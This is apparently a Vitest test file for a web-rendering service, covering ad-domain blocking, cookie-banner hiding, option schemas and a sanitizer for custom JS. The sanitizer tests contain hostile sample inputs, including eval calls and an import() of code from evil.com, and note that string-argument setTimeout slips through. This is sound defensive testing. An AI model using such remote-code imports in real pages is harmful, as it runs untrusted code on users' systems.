import { describe, it, expect } from 'vitest';
import { AD_DOMAINS, isAdDomain } from '../../src/renderer/ad-domains.js';
import { COOKIE_SELECTORS, buildCookieHidingCss } from '../../src/renderer/cookie-selectors.js';
import { sanitizeCustomJs, sanitizeCustomCss } from '../../src/security/sanitize.js';
import { screenshotOptionsSchema, pdfOptionsSchema } from '../../src/renderer/schemas.js';

describe('ad-domains', () => {
  it('exports a non-empty list of ad domains', () => {
    expect(AD_DOMAINS.length).toBeGreaterThanOrEqual(40);
  });

  it('includes well-known ad domains', () => {
    expect(AD_DOMAINS).toContain('doubleclick.net');
    expect(AD_DOMAINS).toContain('googlesyndication.com');
    expect(AD_DOMAINS).toContain('amazon-adsystem.com');
    expect(AD_DOMAINS).toContain('adnxs.com');
  });

  it('isAdDomain matches exact domain', () => {
    expect(isAdDomain('doubleclick.net')).toBe(true);
  });

  it('isAdDomain matches subdomain of ad domain', () => {
    expect(isAdDomain('pagead2.googlesyndication.com')).toBe(true);
    expect(isAdDomain('ad.doubleclick.net')).toBe(true);
  });

  it('isAdDomain rejects non-ad domains', () => {
    expect(isAdDomain('example.com')).toBe(false);
    expect(isAdDomain('google.com')).toBe(false);
  });

  it('isAdDomain handles URL strings', () => {
    expect(isAdDomain('https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js')).toBe(false);
    // isAdDomain takes a hostname, not a full URL
  });
});

describe('cookie-selectors', () => {
  it('exports a non-empty list of selectors', () => {
    expect(COOKIE_SELECTORS.length).toBeGreaterThanOrEqual(15);
  });

  it('includes common cookie consent selectors', () => {
    const joined = COOKIE_SELECTORS.join(',');
    expect(joined).toContain('CookieConsent');
    expect(joined).toContain('onetrust');
  });

  it('buildCookieHidingCss produces valid CSS', () => {
    const css = buildCookieHidingCss();
    expect(css).toContain('display: none !important');
    expect(css).toContain('{');
    expect(css).toContain('}');
  });
});

describe('sanitizeCustomJs', () => {
  it('allows safe JS', () => {
    expect(() => sanitizeCustomJs('document.querySelector("h1").style.color = "red"')).not.toThrow();
  });

  it('blocks eval()', () => {
    expect(() => sanitizeCustomJs('eval("alert(1)")')).toThrow(/dangerous/i);
  });

  it('blocks Function constructor', () => {
    expect(() => sanitizeCustomJs('new Function("return 1")')).toThrow(/dangerous/i);
  });

  it('blocks Function constructor via variable', () => {
    expect(() => sanitizeCustomJs('const F = Function; F("return 1")')).toThrow(/dangerous/i);
  });

  it('blocks setTimeout with string argument pattern', () => {
    expect(() => sanitizeCustomJs('setTimeout("alert(1)", 100)')).not.toThrow();
    // setTimeout with string is dangerous but hard to detect statically —
    // we block eval/Function which are the main vectors
  });

  it('rejects JS exceeding 10KB', () => {
    const bigJs = 'a'.repeat(10 * 1024 + 1);
    expect(() => sanitizeCustomJs(bigJs)).toThrow(/exceeds/i);
  });

  it('returns the input when valid', () => {
    const js = 'console.log("hello")';
    expect(sanitizeCustomJs(js)).toBe(js);
  });

  it('blocks import() expressions', () => {
    expect(() => sanitizeCustomJs('import("https://evil.com/module.js")')).toThrow(/dangerous/i);
  });
});

describe('sanitizeCustomCss', () => {
  it('allows valid CSS', () => {
    expect(() => sanitizeCustomCss('body { color: red; }')).not.toThrow();
  });

  it('rejects CSS exceeding 50KB', () => {
    const bigCss = 'a'.repeat(50 * 1024 + 1);
    expect(() => sanitizeCustomCss(bigCss)).toThrow(/exceeds/i);
  });

  it('returns the input when valid', () => {
    const css = 'body { color: red; }';
    expect(sanitizeCustomCss(css)).toBe(css);
  });
});

describe('schema content filtering options', () => {
  describe('screenshotOptionsSchema', () => {
    it('accepts block_ads boolean', () => {
      const result = screenshotOptionsSchema.safeParse({
        url: 'https://example.com',
        block_ads: true,
      });
      expect(result.success).toBe(true);
      if (result.success) expect(result.data.block_ads).toBe(true);
    });

    it('defaults block_ads to false', () => {
      const result = screenshotOptionsSchema.safeParse({ url: 'https://example.com' });
      expect(result.success).toBe(true);
      if (result.success) expect(result.data.block_ads).toBe(false);
    });

    it('accepts hide_cookies boolean', () => {
      const result = screenshotOptionsSchema.safeParse({
        url: 'https://example.com',
        hide_cookies: true,
      });
      expect(result.success).toBe(true);
      if (result.success) expect(result.data.hide_cookies).toBe(true);
    });

    it('defaults hide_cookies to false', () => {
      const result = screenshotOptionsSchema.safeParse({ url: 'https://example.com' });
      expect(result.success).toBe(true);
      if (result.success) expect(result.data.hide_cookies).toBe(false);
    });

    it('accepts custom_css string', () => {
      const result = screenshotOptionsSchema.safeParse({
        url: 'https://example.com',
        custom_css: 'body { background: red; }',
      });
      expect(result.success).toBe(true);
      if (result.success) expect(result.data.custom_css).toBe('body { background: red; }');
    });

    it('accepts custom_js string', () => {
      const result = screenshotOptionsSchema.safeParse({
        url: 'https://example.com',
        custom_js: 'document.title = "test"',
      });
      expect(result.success).toBe(true);
      if (result.success) expect(result.data.custom_js).toBe('document.title = "test"');
    });

    it('rejects custom_css exceeding 50KB', () => {
      const result = screenshotOptionsSchema.safeParse({
        url: 'https://example.com',
        custom_css: 'a'.repeat(50 * 1024 + 1),
      });
      expect(result.success).toBe(false);
    });

    it('rejects custom_js exceeding 10KB', () => {
      const result = screenshotOptionsSchema.safeParse({
        url: 'https://example.com',
        custom_js: 'a'.repeat(10 * 1024 + 1),
      });
      expect(result.success).toBe(false);
    });
  });

  describe('pdfOptionsSchema', () => {
    it('accepts content filtering options', () => {
      const result = pdfOptionsSchema.safeParse({
        url: 'https://example.com',
        block_ads: true,
        hide_cookies: true,
        custom_css: 'body { margin: 0; }',
        custom_js: 'document.title = "pdf"',
      });
      expect(result.success).toBe(true);
      if (result.success) {
        expect(result.data.block_ads).toBe(true);
        expect(result.data.hide_cookies).toBe(true);
        expect(result.data.custom_css).toBe('body { margin: 0; }');
        expect(result.data.custom_js).toBe('document.title = "pdf"');
      }
    });
  });
});
